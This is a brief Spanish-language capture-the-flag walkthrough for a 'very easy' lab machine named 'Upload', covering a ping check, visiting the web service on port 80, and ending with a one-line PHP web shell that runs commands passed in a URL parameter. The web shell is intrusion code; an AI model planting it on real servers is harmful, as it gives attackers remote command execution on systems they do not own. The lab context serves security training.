#### INFORMACION DE LA MAQUINA.
#### Maquina Upload.
[LINK DE LA MAQUINA](https://mega.nz/file/pOdwgYbB#8lTyf-mWFNq7xvKWObKUV9gkrZj3nzhuHVlGQmnZ6BQ)
#### Dificultad: Muy facil.

---

Enviamos un ping de un paquete para comprobar que la maquina esta activa y lista.
```Linux
Ping -c 1 172.17.0.2
```

Encontraremos el puerto 80 web abierto, por lo cual iremos al buscador y vamos a la pagina.
```Firefox
https://172.17.0.2:80
```

```Linux                                
<?php 
system($_GET[' cmd ']); 
?>
```
